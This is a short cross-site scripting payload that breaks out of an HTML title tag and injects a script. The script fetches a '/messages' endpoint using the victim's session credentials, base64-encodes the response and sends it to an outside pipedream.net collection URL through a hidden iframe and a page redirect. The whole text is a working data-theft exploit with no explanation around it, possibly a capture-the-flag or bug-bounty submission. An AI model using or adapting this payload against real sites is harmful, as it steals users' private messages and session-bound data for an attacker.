</title><script>
(async()=>{
  let r = await fetch("/messages?id=1", { credentials: "include" });
  let j = await r.json();
  let u = "https://eoeipamgnflz15n.m.pipedream.net?c=" + encodeURIComponent(btoa(JSON.stringify(j)));
  let i = document.createElement("iframe");
  i.src = u;
  i.style = "width:1px;height:1px;position:absolute;top:0;left:0;";
  document.body.appendChild(i);
  window.location = u;
})()
</script><title>
